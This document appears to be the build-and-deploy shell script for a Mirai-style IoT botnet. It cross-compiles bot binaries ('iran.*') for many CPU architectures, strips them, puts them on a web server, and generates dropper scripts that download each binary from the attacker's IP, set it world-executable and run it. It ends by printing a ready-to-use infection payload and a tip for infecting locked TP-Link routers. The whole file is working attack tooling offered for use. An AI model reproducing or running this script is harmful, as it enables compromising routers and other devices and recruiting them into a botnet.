#!/bin/sh
export PATH=/etc/xcompile/x86_64/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/sh4/bin:/etc/xcompile/arc/bin:/etc/xcompile/csky-gcc/bin:/etc/xcompile/aarch64/bin:/etc/xcompile/m68k/bin:/etc/xcompile/sparc/bin:/etc/xcompile/i486/bin:$PATH


cd bot

# Build for each arch
powerpc-gcc *.c -o iran.powerpc -DARCH_powerpc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mips-gcc *.c -o iran.mips -DARCH_mips -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mips-gcc *.c -o iran.mipsrouter -DKILLER_OFF -DARCH_mipsrouter -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mipsel-gcc *.c -o iran.mipsel -DARCH_mipsel -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
x86_64-gcc *.c -o iran.x86_64 -DARCH_x86_64 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
m68k-gcc *.c -o iran.m68k -DARCH_m68k -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
sparc-gcc *.c -o iran.sparc -DARCH_sparc -lpthread -O3 -fomit-frame-pointer -fdata-sections -std=c99 -static-libgcc
i486-gcc *.c -o iran.i486 -DARCH_i486 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
aarch64-linux-gcc *.c -o iran.aarch64 -DARCH_aarch64 -pthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv4l-gcc *.c -o iran.armv4l -DARCH_armv4l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv5l-gcc *.c -o iran.armv5l -DARCH_armv5l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv6l-gcc *.c -o iran.armv6l -DARCH_armv6l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv7l-gcc *.c -o iran.armv7l -DARCH_armv7l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
sh4-gcc *.c -o iran.sh4 -DARCH_sh4 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
arc-linux-gcc *.c -o iran.arc -DARCH_arc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static

# strip bins
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.powerpc
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.mipsel
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.i486
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.x86_64
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.m68k
sparc-strip -S --strip-unneeded iran.sparc
aarch64-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.aarch64
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv4l
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv5l
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv6l
armv7l-strip -S --strip-unneeded -R .comment -R .note -R .note.gnu.build-id -R .note.gnu.gold-version iran.armv7l
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.sh4
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.arc
# Move binaries to web dir
mv iran.* /var/www/html

cd ..

IP=$(curl -s ifconfig.co)
cat <<EOF >/var/www/html/cat.sh
#!/bin/sh
wget http://$IP/iran.x86_64 -O x86_64 || curl http://$IP/iran.x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 catloader;
wget http://$IP/iran.aarch64 -O aarch64 || curl http://$IP/iran.aarch64 -o aarch64; chmod 777 aarch64; ./aarch64catloader;
wget http://$IP/iran.m68k -O m68k || curl http://$IP/iran.m68k -o m68k; chmod 777 m68k; ./m68k catloader;
wget http://$IP/iran.mips -O mips || curl http://$IP/iran.mips -o mips; chmod 777 mips; ./mips catloader;
wget http://$IP/iran.mipsel -O mipsel || curl http://$IP/iran.mipsel -o mipsel; chmod 777 mipsel; ./mipsel catloader;
wget http://$IP/iran.powerpc -O powerpc || curl http://$IP/iran.powerpc -o powerpc; chmod 777 powerpc; ./powerpc catloader;
wget http://$IP/iran.sparc -O sparc || curl http://$IP/iran.sparc -o sparc; chmod 777 sparc; ./sparc catloader;
wget http://$IP/iran.sh4 -O sh4 || curl http://$IP/iran.sh4 -o sh4; chmod 777 sh4; ./sh4 catloader;
wget http://$IP/iran.arc -O arc || curl http://$IP/iran.arc -o arc; chmod 777 arc; ./arc catloader;
wget http://$IP/iran.i486 -O i486 || curl http://$IP/iran.i486 -o i486; chmod 777 i486; ./i486 catloader;
wget http://$IP/iran.armv4l -O armv4l || curl http://$IP/iran.armv4l -o armv4l; chmod 777 armv4l; ./armv4l catloader;
wget http://$IP/iran.armv5l -O armv5l || curl http://$IP/iran.armv5l -o armv5l; chmod 777 armv5l; ./armv5l catloader;
wget http://$IP/iran.armv6l -O armv6l || curl http://$IP/iran.armv6l -o armv6l; chmod 777 armv6l; ./armv6l catloader;
wget http://$IP/iran.armv7l -O armv7l || curl http://$IP/iran.armv7l -o armv7l; chmod 777 armv7l; ./armv7l catloader;
EOF

cat <<EOF >/var/www/html/telnet.sh
#!/bin/sh
wget http://$IP/iran.x86_64 -O x86_64 || curl http://$IP/iran.x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 telnet;
wget http://$IP/iran.aarch64 -O aarch64 || curl http://$IP/iran.aarch64 -o aarch64; chmod 777 aarch64; ./aarch64 telnet;
wget http://$IP/iran.m68k -O m68k || curl http://$IP/iran.m68k -o m68k; chmod 777 m68k; ./m68k telnet;
wget http://$IP/iran.mips -O mips || curl http://$IP/iran.mips -o mips; chmod 777 mips; ./mips telnet;
wget http://$IP/iran.mipsel -O mipsel || curl http://$IP/iran.mipsel -o mipsel; chmod 777 mipsel; ./mipsel telnet;
wget http://$IP/iran.powerpc -O powerpc || curl http://$IP/iran.powerpc -o powerpc; chmod 777 powerpc; ./powerpc telnet;
wget http://$IP/iran.sparc -O sparc || curl http://$IP/iran.sparc -o sparc; chmod 777 sparc; ./sparc telnet;
wget http://$IP/iran.sh4 -O sh4 || curl http://$IP/iran.sh4 -o sh4; chmod 777 sh4; ./sh4 telnet;
wget http://$IP/iran.arc -O arc || curl http://$IP/iran.arc -o arc; chmod 777 arc; ./arc telnet;
wget http://$IP/iran.i486 -O i486 || curl http://$IP/iran.i486 -o i486; chmod 777 i486; ./i486 telnet;
wget http://$IP/iran.armv4l -O armv4l || curl http://$IP/iran.armv4l -o armv4l; chmod 777 armv4l; ./armv4l telnet;
wget http://$IP/iran.armv5l -O armv5l || curl http://$IP/iran.armv5l -o armv5l; chmod 777 armv5l; ./armv5l telnet;
wget http://$IP/iran.armv6l -O armv6l || curl http://$IP/iran.armv6l -o armv6l; chmod 777 armv6l; ./armv6l telnet;
wget http://$IP/iran.armv7l -O armv7l || curl http://$IP/iran.armv7l -o armv7l; chmod 777 armv7l; ./armv7l telnet;
EOF

echo "payload: cd /tmp || cd /dev/shm; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; sh cat.sh; rm -rf *"
echo "you can customize tftp and ftpget optionally, if infecting locked-tplink routers use iran.mipsrouter file not iran.mips"

exit 0
